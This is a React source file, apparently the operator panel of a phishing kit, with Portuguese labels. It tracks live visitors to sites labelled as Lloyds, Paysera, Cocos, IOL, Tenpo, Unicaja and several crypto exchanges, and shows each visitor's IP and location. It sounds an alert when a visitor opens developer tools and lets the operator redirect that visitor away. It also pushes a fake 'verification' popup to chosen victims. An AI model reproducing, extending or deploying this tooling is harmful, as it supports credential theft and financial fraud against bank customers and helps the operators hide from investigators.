import { useEffect, useState, useRef } from "react";
import { supabase } from "@/integrations/supabase/client";
import { usePresenceEntries } from "@/hooks/useSessionPresence";
import { Wifi, Globe, Monitor, MapPin, Clock, AlertTriangle, Send, MessageSquare } from "lucide-react";

interface OnlinePresence {
  session_id: string;
  ip_address?: string;
  source?: string;
  city?: string;
  country?: string;
  user_agent?: string;
  online_at: string;
  devtools_open?: boolean;
}

interface DevToolsAlert {
  session_id: string;
  timestamp: string;
}

interface OnlineNowTabProps {
  operatorCode?: string;
  sourceFilter?: string;
}

const sourceColors: Record<string, { label: string; cls: string }> = {
  falconx:     { label: "FalconX",  cls: "border-primary/30 bg-primary/10 text-primary" },
  lloyds:      { label: "Lloyds",   cls: "border-emerald-500/30 bg-emerald-500/10 text-emerald-400" },
  paysera:     { label: "Paysera",  cls: "border-teal-500/30 bg-teal-500/10 text-teal-400" },
  cocosdigital:{ label: "Cocos",    cls: "border-cyan-500/30 bg-cyan-500/10 text-cyan-400" },
  cocosv2:     { label: "Cocos",    cls: "border-cyan-500/30 bg-cyan-500/10 text-cyan-400" },
  cocos:       { label: "Cocos",    cls: "border-cyan-500/30 bg-cyan-500/10 text-cyan-400" },
  plus:        { label: "Plus",     cls: "border-purple-500/30 bg-purple-500/10 text-purple-400" },
  ueex:        { label: "UEEx",     cls: "border-orange-500/30 bg-orange-500/10 text-orange-400" },
  ueexcrypto:  { label: "UEEx",     cls: "border-orange-500/30 bg-orange-500/10 text-orange-400" },
  iol:         { label: "IOL",      cls: "border-violet-500/30 bg-violet-500/10 text-violet-400" },
  invertironline: { label: "IOL",   cls: "border-violet-500/30 bg-violet-500/10 text-violet-400" },
  tenpo:       { label: "Tenpo",    cls: "border-lime-500/30 bg-lime-500/10 text-lime-400" },
  unicaja:     { label: "Unicaja",  cls: "border-sky-600/30 bg-sky-600/10 text-sky-500" },
  ppi:         { label: "PPI",     cls: "border-blue-500/30 bg-blue-500/10 text-blue-400" },
};

const parseBrowserShort = (ua: string | undefined) => {
  if (!ua) return "—";
  if (ua.includes("Chrome") && !ua.includes("Edg")) return "Chrome";
  if (ua.includes("Firefox")) return "Firefox";
  if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
  if (ua.includes("Edg")) return "Edge";
  return "Outro navegador";
};

const timeSince = (d: string) => {
  const s = Math.floor((Date.now() - new Date(d).getTime()) / 1000);
  if (s < 60) return `${s}s`;
  const m = Math.floor(s / 60);
  if (m < 60) return `${m}m`;
  return `${Math.floor(m / 60)}h`;
};

const REDIRECT_URL = "https://google.com.ar";

const togglePopup = async (sessionId: string, show: boolean) => {
  const ch = supabase.channel("admin-popup-broadcast");
  ch.subscribe(async (status) => {
    if (status === "SUBSCRIBED") {
      await ch.send({
        type: "broadcast",
        event: "toggle_popup",
        payload: { session_id: sessionId, show },
      });
      setTimeout(() => supabase.removeChannel(ch), 2000);
    }
  });
};

const kickVisitor = async (sessionId: string) => {
  const ch = supabase.channel("admin-kick-broadcast");
  ch.subscribe(async (status) => {
    if (status === "SUBSCRIBED") {
      await ch.send({
        type: "broadcast",
        event: "redirect_visitor",
        payload: { session_id: sessionId, url: REDIRECT_URL },
      });
      setTimeout(() => supabase.removeChannel(ch), 2000);
    }
  });
};

const OnlineNowTab = ({ operatorCode, sourceFilter }: OnlineNowTabProps) => {
  const sharedPresences = usePresenceEntries();
  const [devToolsAlerts, setDevToolsAlerts] = useState<Record<string, DevToolsAlert>>({});
  const [kicking, setKicking] = useState<string | null>(null);
  const [, tick] = useState(0);
  const audioRef = useRef<AudioContext | null>(null);
  const [operatorSessionIds, setOperatorSessionIds] = useState<Set<string> | null>(null);

  // If operatorCode is provided, fetch session IDs belonging to this operator
  useEffect(() => {
    if (!operatorCode) {
      setOperatorSessionIds(null);
      return;
    }
    const fetchOperatorSessions = async () => {
      const since = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString();
      const { data } = await supabase
        .from("sessions")
        .select("id")
        .eq("operator_code", operatorCode)
        .gte("created_at", since);
      setOperatorSessionIds(new Set((data || []).map((s: any) => s.id)));
    };
    fetchOperatorSessions();
    // Refresh every 30s
    const interval = setInterval(fetchOperatorSessions, 30000);
    return () => clearInterval(interval);
  }, [operatorCode]);

  // Tick every 5s to update time-since
  useEffect(() => {
    const i = setInterval(() => tick((t) => t + 1), 5000);
    return () => clearInterval(i);
  }, []);

  // Use shared presences from context (no local channel needed)
  const presences = sharedPresences as OnlinePresence[];

  // DevTools alert broadcast channel
  useEffect(() => {
    const alertChannel = supabase.channel("admin-devtools-alerts");

    alertChannel
      .on("broadcast", { event: "devtools_detected" }, (payload) => {
        const { session_id, detected, timestamp } = payload.payload || {};
        if (!session_id) return;

        if (detected) {
          try {
            if (!audioRef.current) audioRef.current = new AudioContext();
            const ctx = audioRef.current;
            const osc = ctx.createOscillator();
            const gain = ctx.createGain();
            osc.connect(gain);
            gain.connect(ctx.destination);
            osc.type = "square";
            osc.frequency.setValueAtTime(880, ctx.currentTime);
            gain.gain.setValueAtTime(0.3, ctx.currentTime);
            gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.4);
            osc.start(ctx.currentTime);
            osc.stop(ctx.currentTime + 0.4);
          } catch {}

          setDevToolsAlerts((prev) => ({
            ...prev,
            [session_id]: { session_id, timestamp },
          }));
        } else {
          setDevToolsAlerts((prev) => {
            const copy = { ...prev };
            delete copy[session_id];
            return copy;
          });
        }
      })
      .subscribe();

    return () => { supabase.removeChannel(alertChannel); };
  }, []);

  // Also pick up devtools_open from presence state changes
  useEffect(() => {
    presences.forEach((p) => {
      if (p.devtools_open && p.session_id) {
        setDevToolsAlerts((prev) => {
          if (prev[p.session_id]) return prev;
          return {
            ...prev,
            [p.session_id]: { session_id: p.session_id, timestamp: p.online_at },
          };
        });
      } else if (!p.devtools_open && p.session_id) {
        setDevToolsAlerts((prev) => {
          if (!prev[p.session_id]) return prev;
          const copy = { ...prev };
          delete copy[p.session_id];
          return copy;
        });
      }
    });
  }, [presences]);

  // Filter presences by operator and/or source
  let filteredPresences = operatorSessionIds
    ? presences.filter((p) => operatorSessionIds.has(p.session_id))
    : presences;

  if (sourceFilter) {
    const sources = new Set(sourceFilter === "cocosv2" ? ["cocosv2", "cocosdigital", "cocos"] : [sourceFilter]);
    filteredPresences = filteredPresences.filter((p) => sources.has(p.source || ""));
  }

  const hasAlerts = Object.keys(devToolsAlerts).length > 0;

  if (filteredPresences.length === 0) {
    return (
      <div className="flex flex-col items-center justify-center rounded-xl border border-border bg-card py-20">
        <div className="mb-3 flex h-12 w-12 items-center justify-center rounded-full bg-green-500/10">
          <Wifi className="h-6 w-6 text-green-500/40" />
        </div>
        <p className="text-sm font-medium text-muted-foreground">Nenhum visitante online agora</p>
        <p className="mt-1 text-xs text-muted-foreground/50">Aparecerá em tempo real quando alguém acessar</p>
      </div>
    );
  }

  return (
    <div className="space-y-2">
      {/* ── DevTools Global Alert Banner ── */}
      {hasAlerts && (
        <div className="flex items-center gap-3 rounded-xl border border-red-500/40 bg-red-500/10 px-4 py-3 animate-pulse">
          <AlertTriangle className="h-5 w-5 text-red-400 shrink-0" />
          <div className="flex-1">
            <p className="text-xs font-bold text-red-400">
              ⚠️ {Object.keys(devToolsAlerts).length} visitante{Object.keys(devToolsAlerts).length > 1 ? "s" : ""} abrindo DevTools / inspecionando elemento!
            </p>
            <p className="text-[10px] text-red-400/70 mt-0.5">
              IDs: {Object.keys(devToolsAlerts).map((id) => id.slice(0, 8)).join(", ")}
            </p>
          </div>
        </div>
      )}

      {/* Header count + Cocos Popup Global */}
      <div className="flex items-center gap-2 pb-1">
        <span className="flex items-center gap-1.5 rounded-full bg-green-500/15 border border-green-500/30 px-3 py-1 text-xs font-bold text-green-400">
          <Wifi size={11} className="animate-pulse" />
          {filteredPresences.length} online agora
        </span>

        {/* Global Cocos popup buttons (master only) */}
        {!operatorCode && (
          <>
            <button
              onClick={() => togglePopup("__all__", true)}
              className="flex items-center gap-1.5 rounded-full border border-cyan-500/40 bg-cyan-500/10 px-3 py-1 text-[10px] font-bold text-cyan-400 hover:bg-cyan-500/20 transition-colors"
            >
              <MessageSquare size={11} />
              Cocos: Popup TODOS
            </button>
            <button
              onClick={() => togglePopup("__all__", false)}
              className="flex items-center gap-1.5 rounded-full border border-gray-500/40 bg-gray-500/10 px-3 py-1 text-[10px] font-bold text-gray-400 hover:bg-gray-500/20 transition-colors"
            >
              <MessageSquare size={11} />
              Cocos: Tirar TODOS
            </button>
          </>
        )}
      </div>

      {/* Cards */}
      {filteredPresences.map((p) => {
        const src = p.source || "falconx";
        const srcCfg = sourceColors[src] || sourceColors.falconx;
        const isInspecting = !!(p.devtools_open || devToolsAlerts[p.session_id]);
        const isBeingKicked = kicking === p.session_id;

        return (
          <div
            key={p.session_id}
            className={`flex items-center gap-4 rounded-xl border px-4 py-3 transition-all ${
              isInspecting
                ? "border-red-500/50 bg-red-500/5 shadow-[0_0_12px_rgba(239,68,68,0.15)]"
                : "border-border bg-card hover:border-green-500/20"
            }`}
          >
            {/* Online dot / alert */}
            <div className={`flex h-8 w-8 shrink-0 items-center justify-center rounded-full ${isInspecting ? "bg-red-500/20" : "bg-green-500/10"}`}>
              {isInspecting ? (
                <AlertTriangle className="h-4 w-4 text-red-400 animate-pulse" />
              ) : (
                <span className="h-2.5 w-2.5 rounded-full bg-green-400 animate-pulse" />
              )}
            </div>

            {/* Info */}
            <div className="flex-1 min-w-0 grid grid-cols-2 sm:grid-cols-4 gap-x-6 gap-y-1">
              {/* Site */}
              <div className="flex flex-col gap-0.5">
                <span className="text-[9px] font-bold uppercase tracking-widest text-muted-foreground/50">Site</span>
                <div className="flex items-center gap-1.5">
                  <span className={`inline-flex w-fit items-center rounded-full border px-2 py-0.5 text-[10px] font-bold ${srcCfg.cls}`}>
                    {srcCfg.label}
                  </span>
                  {isInspecting && (
                    <span className="inline-flex items-center gap-0.5 rounded-full border border-red-500/40 bg-red-500/10 px-1.5 py-0.5 text-[9px] font-bold text-red-400">
                      <AlertTriangle size={8} />
                      DevTools
                    </span>
                  )}
                </div>
              </div>

              {/* Session ID */}
              <div className="flex flex-col gap-0.5">
                <span className="text-[9px] font-bold uppercase tracking-widest text-muted-foreground/50">Sessão</span>
                <span className="font-mono text-[11px] text-foreground/80 truncate" title={p.session_id}>
                  {p.session_id.slice(0, 8)}…
                </span>
              </div>

              {/* IP */}
              <div className="flex flex-col gap-0.5">
                <span className="text-[9px] font-bold uppercase tracking-widest text-muted-foreground/50">IP</span>
                <span className="flex items-center gap-1 font-mono text-[11px] text-foreground/80">
                  <Globe size={9} className="text-muted-foreground/50 shrink-0" />
                  {p.ip_address || "—"}
                </span>
              </div>

              {/* Location + Browser + Time */}
              <div className="flex flex-col gap-0.5">
                <span className="text-[9px] font-bold uppercase tracking-widest text-muted-foreground/50">Localização</span>
                <span className="flex items-center gap-2 text-[11px] text-muted-foreground">
                  {(p.city || p.country) && (
                    <span className="flex items-center gap-1">
                      <MapPin size={9} className="shrink-0" />
                      {[p.city, p.country].filter(Boolean).join(", ")}
                    </span>
                  )}
                  <span className="flex items-center gap-1">
                    <Monitor size={9} className="shrink-0" />
                    {parseBrowserShort(p.user_agent)}
                  </span>
                  <span className="flex items-center gap-1 text-muted-foreground/50">
                    <Clock size={9} className="shrink-0" />
                    {timeSince(p.online_at)}
                  </span>
                </span>
              </div>
            </div>

            {/* ── Popup + Kick Buttons ── */}
            <div className="flex shrink-0 items-center gap-1.5">
              {(src === "cocosdigital" || src === "cocosv2" || src === "cocos") && (
                <>
                  <button
                    onClick={() => togglePopup(p.session_id, true)}
                    title="Mostrar popup de verificação"
                    className="flex items-center gap-1 rounded-lg border border-cyan-500/40 bg-cyan-500/10 px-2 py-1.5 text-[10px] font-bold text-cyan-400 hover:bg-cyan-500/20 transition-colors"
                  >
                    <MessageSquare size={11} />
                    Popup
                  </button>
                  <button
                    onClick={() => togglePopup(p.session_id, false)}
                    title="Esconder popup"
                    className="flex items-center gap-1 rounded-lg border border-gray-500/40 bg-gray-500/10 px-2 py-1.5 text-[10px] font-bold text-gray-400 hover:bg-gray-500/20 transition-colors"
                  >
                    <MessageSquare size={11} />
                    Tirar
                  </button>
                </>
              )}
              <button
                onClick={async () => {
                  setKicking(p.session_id);
                  await kickVisitor(p.session_id);
                  setTimeout(() => setKicking(null), 3000);
                }}
                disabled={isBeingKicked}
                title="Redirecionar visitante para o Google"
                className="flex items-center gap-1 rounded-lg border border-orange-500/40 bg-orange-500/10 px-2 py-1.5 text-[10px] font-bold text-orange-400 hover:bg-orange-500/20 transition-colors disabled:opacity-50"
              >
                <Send size={11} className={isBeingKicked ? "animate-ping" : ""} />
                {isBeingKicked ? "…" : "Kick"}
              </button>
            </div>
          </div>
        );
      })}
    </div>
  );
};

export default OnlineNowTab;
